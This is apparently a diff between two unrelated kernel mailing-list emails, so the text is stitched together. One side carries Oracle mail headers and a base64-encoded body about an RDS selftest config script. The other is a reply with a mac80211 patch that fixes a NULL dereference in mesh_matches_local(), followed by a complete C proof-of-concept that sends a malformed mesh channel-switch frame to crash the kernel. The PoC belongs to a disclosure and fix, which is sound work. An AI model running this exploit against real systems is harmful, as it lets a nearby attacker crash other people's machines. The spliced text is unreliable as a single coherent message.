-In-Reply-To: <20260318034244.2595020-1-xmei5@asu.edu>
-X-Spamd-Result: default: False [-1.66 / 15.00];
-	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
-	MID_RHS_NOT_FQDN(0.50)[];
-	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
+X-Exchange-RoutingPolicyChecked:
+	BU7EWXzkATAxCn2McjXOlT8pYaLxkVN/IV0ZiyuQ6GJ77kG9Iy70iL/lV5ZJ9C5KOfVqLiDb5Yjg29B7HA0H9TgPs7WH7GryaKgGr2bHjcQgDQ6WaRiK6pYo+Bt0P1oOj4tkZGlFRtCRKrNHzieMuD5Ij0eNpP4z2Xx9NtPNL3JRssPXvVjIKWq8EPeuYaGyMyT4jZFEmJLrUrnzwl+CkZG1P1ZZt4pm60fVy5gd/jMLSloWX591nx7bu8c8Hc3QOPyizGiLdjcVDzPhxSAurhE7HflgBNrPgz+ur0q4owSGAMTfKPkLrSkdPa7PQxxpYRY1vmoyLIF4AtnNNgI5sg==
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
+	AeCGye3NCNUxFZK06ICZX0gz+ydIT1Upi0RmHJYOyzKO05Di/XRFhQnobrvgSUy+94RO8mBV6k8ltvM0YPDRpqGpqRlYVLJjIxi+QPvyw8HUWfBJxNqoycFodsqeA66cZKJ6zj2aaDHmwxvFdYAIHK+0hRFgbPJ1pRz0i78Dx/s2zCPrFVrbaV2lKsHWJbut7SjJs3qFM7Iw782A46yHgfFfREY6NmvYh3/S6574xJsCh7A941vPJjsbM/LnFH73A8tvdavg7XQoAXKjmrBRWRc43MdMya6euFvFIYMpLkAQp+7wA0JOE4iQV27l/+kO312dMmZp22QXtdpZ8QO9ZXjERi500YfQGGovhspTAU4qRTO4GdfDbdtWCcA/jGTQ6Vs590+o/fbh7xjNaWeBhGQSymXj+6lAmQ5nj5YX9i35E2gzgBE8R5TiK4kEN+OYVNY3vC5kkZrb5BZ8BhUzCg5Bm5Ce3RBr43/SIS1Gg/cyN8JeA0RvdeHw7RrJjhl8lZ4fOgnb5wBgXQSrOybnRf3pZPwi+jCLAo22zFq7R5EZu6bmjGGCXoZluwSDzfGMXaToKsPYBKrNd5yHa3g6v5qt58069Bot9z3IPvlSe8o=
+X-OriginatorOrg: oracle.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: DM4PR10MB7404.namprd10.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 4edaf013-7556-41f7-7d5a-08de84a90c02
+X-MS-Exchange-CrossTenant-originalarrivaltime: 18 Mar 2026 04:44:31.8577
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: /Rd6CN5KwNaXHPlzY3GUvp/+EZXU+bTH17itnIWz1dU8WDDXSwaETsCYbmKkkZN6GW4qkg0887WyYBzdmo4Ab7lyLmabIDw6JU4IAnLs5Sg=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: DS0PR10MB7224
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
+ definitions=2026-03-17_05,2026-03-17_02,2025-10-01_01
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 mlxlogscore=999 phishscore=0
+ adultscore=0 malwarescore=0 spamscore=0 mlxscore=0 bulkscore=0
+ suspectscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.12.0-2603050001 definitions=main-2603180037
+X-Proofpoint-GUID: L233r9WLcvLtw2aLIYB-woBwFBfbIqvx
+X-Proofpoint-ORIG-GUID: L233r9WLcvLtw2aLIYB-woBwFBfbIqvx
+X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwMzE4MDAzNyBTYWx0ZWRfX82bOx8bNmqPR
+ K+yGmLqzrd0s7swvxpS51H72d5tYz1En2YL78MwhBSbjyJ14a/5OVbmryKDS49eAVL4uOFj3CxG
+ NdLiDczsr5vXC+ewbEJp2nm8PHvg5R6v6ZLNrBO7+ko+xIdGAldDCNX6vp/cAQ0AG/hXqBx6NNU
+ jgihNyIPy7oQvTqJ/kwhXMJmIvKM5pJtu7Q4o/gLHe1vyuGI5rJkO38AGvG4mHZjA421aYOux60
+ nl/HsDYXyn8XS3l5WbPZqM0mZglj9SrRqw5QcebeIysi+0xB928LfNvt0agDyXncOSOn17DNHce
+ HeAXoQkBt6cuPzs50kNp4vKpGcQ/2fKUABTKbeV1uMOiKWGaqP4VjzXBeTiUvTtLM3T/kGXBjfM
+ Cztw/p1BJpY19n4f79C94yoI8AbbJVmzSNz1QrEEf2JLAtCr8X8Fs/844hUN4PrYY+oWfajeugO
+ 4zMbsxuII3UAfUpW9zuY72uSNWwQIY9X5GWhWHBY=
+X-Authority-Analysis: v=2.4 cv=IN4PywvG c=1 sm=1 tr=0 ts=69ba2db4 b=1 cx=c_pps
+ a=e1sVV491RgrpLwSTMOnk8w==:117 a=e1sVV491RgrpLwSTMOnk8w==:17
+ a=z/mQ4Ysz8XfWz/Q5cLBRGdckG28=:19 a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19
+ a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10 a=Yq5XynenixoA:10 a=GoEa3M9JfhUA:10
+ a=VkNPw1HP01LnGYTKEx00:22 a=jiCTI4zE5U7BLdzWsZGv:22 a=x4eqshVgHu-cdnggieHk:22
+ a=pKHraPMAlGpSlHMEaMcA:9 a=QEXdDO2ut3YA:10 cc=ntf awl=host:13824
+X-Spamd-Result: default: False [-0.06 / 15.00];
+	ARC_REJECT(1.00)[cv is fail on i=2];
+	DMARC_POLICY_ALLOW(-0.50)[oracle.com,reject];
 	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
+	R_DKIM_ALLOW(-0.20)[oracle.com:s=corp-2025-04-25,oracle.onmicrosoft.com:s=selector2-oracle-onmicrosoft-com];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
+	MIME_BASE64_TEXT(0.10)[];
 	HAS_LIST_UNSUB(-0.01)[];
-	FREEMAIL_CC(0.00)[vger.kernel.org,sipsolutions.net,gmail.com];
-	TAGGED_FROM(0.00)[bounces-268880-lists,netdev=lfdr.de];
-	FROM_HAS_DN(0.00)[];
-	DKIM_TRACE(0.00)[asu.edu:+];
+	TO_DN_EQ_ADDR_ALL(0.00)[];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,oracle.onmicrosoft.com:dkim,config.sh:url,oracle.com:dkim,oracle.com:mid];
 	RCVD_TLS_LAST(0.00)[];
-	MIME_TRACE(0.00)[0:+];
+	TAGGED_FROM(0.00)[bounces-268881-lists,netdev=lfdr.de];
 	FORGED_SENDER_MAILLIST(0.00)[];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	DKIM_TRACE(0.00)[oracle.com:+,oracle.onmicrosoft.com:+];
 	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
-	RCPT_COUNT_FIVE(0.00)[5];
-	RCVD_COUNT_FIVE(0.00)[5];
+	MIME_TRACE(0.00)[0:+];
 	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
-	MISSING_XM_UA(0.00)[];
-	TO_DN_NONE(0.00)[];
-	TAGGED_RCPT(0.00)[netdev];
+	FROM_NEQ_ENVFROM(0.00)[allison.henderson@oracle.com,netdev@vger.kernel.org];
+	FROM_HAS_DN(0.00)[];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
 	NEURAL_HAM(-0.00)[-1.000];
-	RCVD_VIA_SMTP_AUTH(0.00)[];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[asu.edu:dkim,asu.edu:email,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
-X-Rspamd-Queue-Id: 26C0B2B5CA1
+	RCPT_COUNT_SEVEN(0.00)[10];
+	MID_RHS_MATCH_FROM(0.00)[];
+	TAGGED_RCPT(0.00)[netdev];
+	RCVD_COUNT_SEVEN(0.00)[9]
+X-Rspamd-Queue-Id: 480012B5CC8
 X-Rspamd-Action: no action
 X-Rspamd-Server: lfdr
 
-On Tue, Mar 17, 2026 at 08:42:44PM -0700, Xiang Mei wrote:
-> mesh_matches_local() unconditionally dereferences ie->mesh_config to
-> compare mesh configuration parameters. When called from
-> mesh_rx_csa_frame(), the parsed action-frame elements may not contain a
-> Mesh Configuration IE, leaving ie->mesh_config NULL and triggering a
-> kernel NULL pointer dereference.
-> 
-> The other two callers are already safe:
->   - ieee80211_mesh_rx_bcn_presp() checks !elems->mesh_config before
->     calling mesh_matches_local()
->   - mesh_plink_get_event() is only reached through
->     mesh_process_plink_frame(), which checks !elems->mesh_config, too
-> 
-> mesh_rx_csa_frame() is the only caller that passes raw parsed elements
-> to mesh_matches_local() without guarding mesh_config. An adjacent
-> attacker can exploit this by sending a crafted CSA action frame that
-> includes a valid Mesh ID IE but omits the Mesh Configuration IE,
-> crashing the kernel.
-> 
-> The captured crash log:
-> 
-> Oops: general protection fault, probably for non-canonical address ...
-> KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
-> Workqueue: events_unbound cfg80211_wiphy_work
-> [...]
-> Call Trace:
->  <TASK>
->  ? __pfx_mesh_matches_local (net/mac80211/mesh.c:65)
->  ieee80211_mesh_rx_queued_mgmt (net/mac80211/mesh.c:1686)
->  [...]
->  ieee80211_iface_work (net/mac80211/iface.c:1754 net/mac80211/iface.c:1802)
->  [...]
->  cfg80211_wiphy_work (net/wireless/core.c:426)
->  process_one_work (net/kernel/workqueue.c:3280)
->  ? assign_work (net/kernel/workqueue.c:1219)
->  worker_thread (net/kernel/workqueue.c:3352)
->  ? __pfx_worker_thread (net/kernel/workqueue.c:3385)
->  kthread (net/kernel/kthread.c:436)
->  [...]
->  ret_from_fork_asm (net/arch/x86/entry/entry_64.S:255)
->  </TASK>
-> 
-> This patch adds a NULL check for ie->mesh_config at the top of
-> mesh_matches_local() to return false early when the Mesh Configuration
-> IE is absent.
-> 
-> Fixes: 2e3c8736820b ("mac80211: support functions for mesh")
-> Reported-by: Weiming Shi <bestswngs@gmail.com>
-> Signed-off-by: Xiang Mei <xmei5@asu.edu>
-> ---
->  net/mac80211/mesh.c | 3 +++
->  1 file changed, 3 insertions(+)
-> 
-> diff --git a/net/mac80211/mesh.c b/net/mac80211/mesh.c
-> index 28624e57aa499..8fdbdf9ba2a9e 100644
-> --- a/net/mac80211/mesh.c
-> +++ b/net/mac80211/mesh.c
-> @@ -79,6 +79,9 @@ bool mesh_matches_local(struct ieee80211_sub_if_data *sdata,
->  	 *   - MDA enabled
->  	 * - Power management control on fc
->  	 */
-> +	if (!ie->mesh_config)
-> +		return false;
-> +
->  	if (!(ifmsh->mesh_id_len == ie->mesh_id_len &&
->  	     memcmp(ifmsh->mesh_id, ie->mesh_id, ie->mesh_id_len) == 0 &&
->  	     (ifmsh->mesh_pp_id == ie->mesh_config->meshconf_psel) &&
-> -- 
-> 2.43.0
->
-
-Thanks for your attention for this bug. 
-
-The following information could help you to reproduce the bug:
-
-Configs:
-
-```
-CONFIG_WIRELESS=y
-CONFIG_CFG80211=y
-CONFIG_MAC80211=y
-CONFIG_MAC80211_MESH=y
-CONFIG_MAC80211_HWSIM=y
-CONFIG_RFKILL=y
-```
-
-To reproduce the crash, I attached the poc to this email:
-
-```c
-#define _GNU_SOURCE
-#include <endian.h>
-#include <errno.h>
-#include <linux/genetlink.h>
-#include <linux/if.h>
-#include <linux/netlink.h>
-#include <linux/nl80211.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <unistd.h>
-
-#define BUF_SIZE 4096
-#define MESH_ID "meshpoc"
-#define MESH_FREQ 2412
-#define WLAN_EID_CHANNEL_SWITCH 37
-#define WLAN_EID_MESH_ID 114
-
-struct nl_req {
-        struct nlmsghdr nlh;
-        struct genlmsghdr genl;
-        char buf[BUF_SIZE];
-};
-
-static uint16_t seq;
-
-static void die(const char *s) { perror(s); exit(1); }
-
-static void nla_put(struct nlmsghdr *n, uint16_t type, const void *d, size_t l)
-{
-        struct nlattr *a = (void *)n + NLMSG_ALIGN(n->nlmsg_len);
-        a->nla_type = type;
-        a->nla_len = NLA_HDRLEN + l;
-        if (d && l) memcpy((void *)a + NLA_HDRLEN, d, l);
-        n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(a->nla_len);
-}
-
-static void nla_put_u32(struct nlmsghdr *n, uint16_t t, uint32_t v)
-{ nla_put(n, t, &v, 4); }
-
-static void nla_put_flag(struct nlmsghdr *n, uint16_t t)
-{ nla_put(n, t, NULL, 0); }
-
-static int genl_send(int fd, struct nlmsghdr *nlh)
-{
-        struct sockaddr_nl a = { .nl_family = AF_NETLINK };
-        char resp[BUF_SIZE];
-
-        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-        nlh->nlmsg_seq = ++seq;
-        nlh->nlmsg_pid = getpid();
-
-        if (sendto(fd, nlh, nlh->nlmsg_len, 0, (void *)&a, sizeof(a)) < 0)
-                return -errno;
-        ssize_t n = recv(fd, resp, sizeof(resp), 0);
-        if (n < 0) return -errno;
-        struct nlmsghdr *h = (void *)resp;
-        if (h->nlmsg_type == NLMSG_ERROR)
-                return ((struct nlmsgerr *)NLMSG_DATA(h))->error;
-        return 0;
-}
-
-static int genl_resolve(int fd, const char *name)
-{
-        struct nl_req req = {};
-        struct nlmsghdr *nlh = &req.nlh;
-        struct genlmsghdr *genl = NLMSG_DATA(nlh);
-        struct sockaddr_nl a = { .nl_family = AF_NETLINK };
-        char resp[BUF_SIZE];
-
-        nlh->nlmsg_type = GENL_ID_CTRL;
-        nlh->nlmsg_flags = NLM_F_REQUEST;
-        nlh->nlmsg_seq = ++seq;
-        nlh->nlmsg_pid = getpid();
-        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*genl));
-        genl->cmd = CTRL_CMD_GETFAMILY;
-        genl->version = 1;
-        nla_put(nlh, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);
-
-        if (sendto(fd, nlh, nlh->nlmsg_len, 0, (void *)&a, sizeof(a)) < 0)
-                return -errno;
-
-        ssize_t n = recv(fd, resp, sizeof(resp), 0);
-        if (n < 0) return -errno;
-        struct nlmsghdr *h = (void *)resp;
-        if (h->nlmsg_type == NLMSG_ERROR)
-                return ((struct nlmsgerr *)NLMSG_DATA(h))->error;
-
-        struct genlmsghdr *gh = NLMSG_DATA(h);
-        int rem = h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
-        struct nlattr *at;
-        for (at = (void *)gh + GENL_HDRLEN; rem >= (int)sizeof(*at);
-             rem -= NLA_ALIGN(at->nla_len), at = (void *)at + NLA_ALIGN(at->nla_len))
-                if (at->nla_type == CTRL_ATTR_FAMILY_ID)
-                        return *(uint16_t *)((void *)at + NLA_HDRLEN);
-        return -ENOENT;
-}
-
-static void get_mac(const char *ifname, uint8_t mac[6])
-{
-        struct ifreq ifr = {};
-        int fd = socket(AF_INET, SOCK_DGRAM, 0);
-        if (fd < 0) die("socket");
-        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
-        if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) die("SIOCGIFHWADDR");
-        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
-        close(fd);
-}
-
-static void if_down(const char *ifname)
-{
-        struct ifreq ifr = {};
-        int fd = socket(AF_INET, SOCK_DGRAM, 0);
-        if (fd < 0) return;
-        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
-        ioctl(fd, SIOCGIFFLAGS, &ifr);
-        ifr.ifr_flags &= ~IFF_UP;
-        ioctl(fd, SIOCSIFFLAGS, &ifr);
-        close(fd);
-}
-
-static void if_up(const char *ifname)
-{
-        struct ifreq ifr = {};
-        int fd = socket(AF_INET, SOCK_DGRAM, 0);
-        if (fd < 0) die("socket");
-        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
-        ioctl(fd, SIOCGIFFLAGS, &ifr);
-        ifr.ifr_flags |= IFF_UP;
-        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) die("SIOCSIFFLAGS");
-        close(fd);
-}
-
-/* Set interface type to MESH_POINT */
-static int set_mesh_type(int fd, int nl80211, int ifindex)
-{
-        struct nl_req req = {};
-        req.nlh.nlmsg_type = nl80211;
-        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
-        req.genl.cmd = NL80211_CMD_SET_INTERFACE;
-        nla_put_u32(&req.nlh, NL80211_ATTR_IFINDEX, ifindex);
-        nla_put_u32(&req.nlh, NL80211_ATTR_IFTYPE, NL80211_IFTYPE_MESH_POINT);
-        return genl_send(fd, &req.nlh);
-}
-
-/* Join a mesh network */
-static int join_mesh(int fd, int nl80211, int ifindex)
-{
-        struct nl_req req = {};
-        req.nlh.nlmsg_type = nl80211;
-        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
-        req.genl.cmd = NL80211_CMD_JOIN_MESH;
-        nla_put_u32(&req.nlh, NL80211_ATTR_IFINDEX, ifindex);
-        nla_put(&req.nlh, NL80211_ATTR_MESH_ID, MESH_ID, strlen(MESH_ID));
-        nla_put_u32(&req.nlh, NL80211_ATTR_WIPHY_FREQ, MESH_FREQ);
-        return genl_send(fd, &req.nlh);
-}
-
-/*
- * Build the malformed CSA action frame:
- *   - Includes Mesh ID IE (passes the mesh_id_len + memcmp check)
- *   - Omits Mesh Configuration IE (elems->mesh_config stays NULL)
- *   -> mesh_matches_local() dereferences NULL -> kernel crash
- */
-static size_t build_bad_frame(uint8_t *buf, const uint8_t da[6],
-                              const uint8_t sa[6])
-{
-        uint8_t *p = buf;
-        size_t idlen = strlen(MESH_ID);
-        memset(buf, 0, 256);
-
-        /* 802.11 mgmt header — action frame */
-        *(uint16_t *)p = htole16(0x00d0); p += 2;
-        p += 2;
-        memcpy(p, da, 6); p += 6;
-        memcpy(p, sa, 6); p += 6;
-        memcpy(p, sa, 6); p += 6;
-        p += 2;
-
-        /* Spectrum management: channel switch */
-        *p++ = 0; *p++ = 4;
-
-        /* Channel Switch IE */
-        *p++ = WLAN_EID_CHANNEL_SWITCH; *p++ = 3;
-        *p++ = 0; *p++ = 1; *p++ = 1;
-
-        /* Mesh ID IE — matches victim */
-        *p++ = WLAN_EID_MESH_ID; *p++ = idlen;
-        memcpy(p, MESH_ID, idlen); p += idlen;
-
-        /* Mesh Config IE intentionally OMITTED */
-        return p - buf;
-}
-
-/* Send raw frame via NL80211_CMD_FRAME */
-static int tx_frame(int fd, int nl80211, int ifindex, void *frame, size_t len)
-{
-        struct nl_req req = {};
-        req.nlh.nlmsg_type = nl80211;
-        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
-        req.genl.cmd = NL80211_CMD_FRAME;
-        nla_put_u32(&req.nlh, NL80211_ATTR_IFINDEX, ifindex);
-        nla_put_u32(&req.nlh, NL80211_ATTR_WIPHY_FREQ, MESH_FREQ);
-        nla_put(&req.nlh, NL80211_ATTR_FRAME, frame, len);
-        nla_put_flag(&req.nlh, NL80211_ATTR_DONT_WAIT_FOR_ACK);
-        return genl_send(fd, &req.nlh);
-}
-
-int main(void)
-{
-        uint8_t da[6], sa[6], frame[256];
-        int fd, nl80211, ret, idx0, idx1;
-
-        printf("[*] mesh_matches_local() NULL deref PoC\n");
-
-        fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-        if (fd < 0) die("socket");
-        struct sockaddr_nl local = { .nl_family = AF_NETLINK, .nl_pid = getpid() };
-        if (bind(fd, (void *)&local, sizeof(local)) < 0) die("bind");
-
-        nl80211 = genl_resolve(fd, "nl80211");
-        if (nl80211 < 0) { fprintf(stderr, "nl80211 not found\n"); return 1; }
-
-        idx0 = if_nametoindex("wlan0");
-        idx1 = if_nametoindex("wlan1");
-        if (!idx0 || !idx1) {
-                fprintf(stderr, "wlan0/wlan1 not found. Need mac80211_hwsim radios=2\n");
-                return 1;
-        }
-
-        /* Step 1: Set both interfaces to mesh mode */
-        printf("[*] configuring mesh interfaces\n");
-        if_down("wlan0");
-        if_down("wlan1");
-        usleep(200000);
-
-        ret = set_mesh_type(fd, nl80211, idx0);
-        if (ret) { fprintf(stderr, "set wlan0 mesh: %d\n", ret); return 1; }
-        ret = set_mesh_type(fd, nl80211, idx1);
-        if (ret) { fprintf(stderr, "set wlan1 mesh: %d\n", ret); return 1; }
-
-        if_up("wlan0");
-        if_up("wlan1");
-
-        /* Step 2: Join mesh */
-        ret = join_mesh(fd, nl80211, idx0);
-        if (ret) { fprintf(stderr, "join wlan0: %d\n", ret); return 1; }
-        ret = join_mesh(fd, nl80211, idx1);
-        if (ret) { fprintf(stderr, "join wlan1: %d\n", ret); return 1; }
-
-        printf("[*] mesh joined on %d MHz\n", MESH_FREQ);
-        sleep(1);
-
-        /* Step 3: Send malformed frame */
-        get_mac("wlan0", da);
-        get_mac("wlan1", sa);
-        printf("[*] victim  %02x:%02x:%02x:%02x:%02x:%02x\n",
-               da[0], da[1], da[2], da[3], da[4], da[5]);
-        printf("[*] attacker %02x:%02x:%02x:%02x:%02x:%02x\n",
-               sa[0], sa[1], sa[2], sa[3], sa[4], sa[5]);
-
-        size_t flen = build_bad_frame(frame, da, sa);
-        printf("[*] sending malformed CSA frame (%zu bytes)\n", flen);
-
-        ret = tx_frame(fd, nl80211, idx1, frame, flen);
-        if (ret) { fprintf(stderr, "tx failed: %d\n", ret); return 1; }
-
-        printf("[*] sent — check dmesg for null-ptr-deref in mesh_matches_local\n");
-        sleep(3);
-        return 0;
-}
-```
-
-The intended crash was attached in the commit message. Please let me know
-if you have any questions for the patch and poc.
-
-Thanks,
-Xiang
-
+T24gVHVlLCAyMDI2LTAzLTE3IGF0IDE0OjU0IC0wNzAwLCBKYWt1YiBLaWNpbnNraSB3cm90ZToN
+Cj4gT24gVHVlLCAxNyBNYXIgMjAyNiAxODoyNjoxMCArMDAwMCBBbGxpc29uIEhlbmRlcnNvbiB3
+cm90ZToNCj4gPiBPbiBUdWUsIDIwMjYtMDMtMTcgYXQgMTU6NDEgKzAxMDAsIFBhb2xvIEFiZW5p
+IHdyb3RlOg0KPiA+ID4gT24gMy8xNy8yNiAxMjo1OCBBTSwgQWxsaXNvbiBIZW5kZXJzb24gd3Jv
+dGU6ICANCj4gPiA+ID4gZGlmZiAtLWdpdCBhL3Rvb2xzL3Rlc3Rpbmcvc2VsZnRlc3RzL25ldC9y
+ZHMvY29uZmlnLnNoIGIvdG9vbHMvdGVzdGluZy9zZWxmdGVzdHMvbmV0L3Jkcy9jb25maWcuc2gN
+Cj4gPiA+ID4gaW5kZXggNzkxYzhkYmUxMDk1Li43Y2Y1NmVlODg4MmYgMTAwNzU1DQo+ID4gPiA+
+IC0tLSBhL3Rvb2xzL3Rlc3Rpbmcvc2VsZnRlc3RzL25ldC9yZHMvY29uZmlnLnNoDQo+ID4gPiA+
+ICsrKyBiL3Rvb2xzL3Rlc3Rpbmcvc2VsZnRlc3RzL25ldC9yZHMvY29uZmlnLnNoDQo+ID4gPiA+
+IEBAIC0yNCw3ICsyNCw3IEBAIHdoaWxlIGdldG9wdHMgImciIG9wdDsgZG8NCj4gPiA+ID4gICAg
+ZXNhYw0KPiA+ID4gPiAgZG9uZQ0KPiA+ID4gPiAgDQo+ID4gPiA+IC1DT05GX0ZJTEU9InRvb2xz
+L3Rlc3Rpbmcvc2VsZnRlc3RzL25ldC9jb25maWciDQo+ID4gPiA+ICtDT05GX0ZJTEU9InRvb2xz
+L3Rlc3Rpbmcvc2VsZnRlc3RzL25ldC9yZHMvY29uZmlnIg0KPiA+ID4gPiAgDQo+ID4gPiA+ICAj
+IG5vIG1vZHVsZXMNCj4gPiA+ID4gIHNjcmlwdHMvY29uZmlnIC0tZmlsZSAiJENPTkZfRklMRSIg
+LS1kaXNhYmxlIENPTkZJR19NT0RVTEVTICANCj4gPiA+IA0KPiA+ID4gVGhpcyBsb29rcyB3cm9u
+Zz8hPyBUaGUgc2NyaXB0IGlzIGdvaW5nIHRvIHVwZGF0ZSB0aGUgY29uZmlnIGZpbGUgd2hpY2gN
+Cj4gPiA+IGlzIHVuZGVyIGdpdCBjb250cm9sLiBZb3UgcHJvYmFibHkgd2FudCB0byBjb3B5IHRo
+ZSBkZWZhdWx0IGNvbmZpZyBpbiBhDQo+ID4gPiB0bXAgZmlsZSBmaWxlLCBlZGl0IHRoZSBsYXR0
+ZXIgYW5kIGFkZCBpdCB0byAuZ2l0aWdub3JlIGFuZCBFWFRSQV9DTEVBTi4NCj4gPiA+IA0KPiA+
+ID4gVGhlIGlzc3VlIGxvb2tzIHByZS1leGlzdGVudCwgYnV0IHNpbmNlIHlvdSBhcmUgdG91Y2hp
+bmcgdGhpcyBwYXJ0Li4uDQo+IA0KPiBXZWxsIHNwb3R0ZWQuDQo+IA0KPiA+IFN1cmUsIHNvIGNv
+bmZpZy5zaCBpc250IGFjdHVhbGx5IGNhbGxlZCBieSBhbnl0aGluZyB3aXRoaW4gdGhlIHNlbGYN
+Cj4gPiB0ZXN0cyBvciB0ZXN0aW5nIGhhcm5lc3MuICBJdCBtb3JlIGludGVuZGVkIHRvIGJlIGEg
+c3RhbmQgYWxvbmUgdG9vbA0KPiA+IGZvciB3aGVuIGRldmVsb3BlcnMgd2FudCB0byBlbmFibGUv
+ZGlzYWJsZSBnY292LiAgSWYgeW91IGxpa2Ugd2UgY2FuDQo+ID4gYWRqdXN0IHRoZSB0YXJnZXQg
+dG8gYSByZHMvY29uZmlnLmxvY2FsIGFuZCBjb3B5IHJkcy9jb25maWcgdGhlcmUuICANCj4gPiAN
+Cj4gPiBDT05GX0ZJTEU9InRvb2xzL3Rlc3Rpbmcvc2VsZnRlc3RzL25ldC9yZHMvY29uZmlnLmxv
+Y2FsIiAgDQo+ID4gY3AgdG9vbHMvdGVzdGluZy9zZWxmdGVzdHMvbmV0L3Jkcy9jb25maWcgIiRD
+T05GX0ZJTEUiDQo+ID4gDQo+ID4gQWx0ZXJuYXRlbHkgd2UgY291bGQgc2ltcGx5IGhhdmUgdGhl
+IHNjcmlwdCBkZWZhdWx0IHRvIGNvbmZpZy5sb2NhbCwNCj4gPiBhbmQgYWRkIGEgcGFyYW1ldGVy
+IHRoYXQgYWxsb3dzIHRoZSBjYWxsZXIgdG8gc3BlY2lmeSB0aGUgY29uZmlnDQo+ID4gcGF0aC4g
+IExldCBtZSBrbm93IHdoYXQgeW91IHByZWZlci4NCj4gPiANCj4gPiBJIG1heSBzcGxpdCBvZmYg
+dGhlIGNvbmZpZy5zaCBjaGFuZ2VzIGludG8gYSBzZXBhcmF0ZSBwYXRjaCBzbyB0aGF0DQo+ID4g
+SmFrdWIgY2FuIHN0YXJ0IHVzaW5nIHRoZSBjb25maWcgdGhvdWdoLg0KPiANCj4gSG93IGRvIHlv
+dSBhY3R1YWxseSB1c2UgaXQ/wqANCj4gDQpBcyBpdCBpcywgY2FsbGluZyBjb25maWcuc2ggZGly
+ZWN0bHkgd291bGQgYWRkIFJEUyBjb25maWdzIHRvIHRvb2xzL3Rlc3Rpbmcvc2VsZnRlc3RzL25l
+dC9jb25maWcswqANCmFuZCBwYXNzaW5nIHRoZSAtZyBmbGFnIHdvdWxkIGVuYWJsZSBnY292DQoN
+Cj4gUHJlc3VtYWJseSB3ZSBzaG91bGQgYmUgbW9kaWZ5aW5nIHRoZSBjb25maWcNCj4gdXNlZCBm
+b3IgYnVpbGQgZGlyZWN0bHkgbm90IGEgc25pcHBldC4NCj4gDQo+IEJ5IGRlZmF1bHQgc2NyaXB0
+cy9jb25maWcgd2lsbCBhbHJlYWR5IHVzZSAuY29uZmlnIGluIGN1cnJlbnQgZGlyZWN0b3J5DQo+
+IHdoaWNoIHNob3VsZCBiZSB3aGF0IHBlb3BsZSB3b3VsZCB3YW50IDk5JSBvZiB0aGUgdGltZT8N
+Cj4gV2UgY2FuIGFkZCAtLWZpbGUgdG8gdGhlIHNjcmlwdCB0byBzZWxlY3QgdGhlIGNvbmZpZyB1
+c2VyIHdhbnRzIHRvDQo+IGNoYW5nZSBidXQga2VlcCB0aGUgZGVmYXVsdCBvZiBub3Qgc3BlY2lm
+eWluZyB0aGUgZmlsZSBoZW5jZSAuY29uZmlnPw0KDQpUaGF0IGRvZXMgc291bmQgY2xlYW5lci7C
+oEknbGwgZHJvcCB0aGUgLS1maWxlIGZyb20gdGhlIHNjcmlwdHMvY29uZmlnIGNhbGxzIHNvIGl0
+IGRlZmF1bHRzIHRvIC5jb25maWcsIGFuZCBhZGQgYW4NCm9wdGlvbmFsIGZsYWcgdG8gY29uZmln
+LnNoIGZvciBhbnlvbmUgd2hvIHdhbnRzIHRvIHRhcmdldCBhIGRpZmZlcmVudCBmaWxlLg0KDQpU
+aGFuayB5b3UgZm9yIHRoZSByZXZpZXdzIQ0KDQpBbGxpc29uICAgDQoNCg==
 
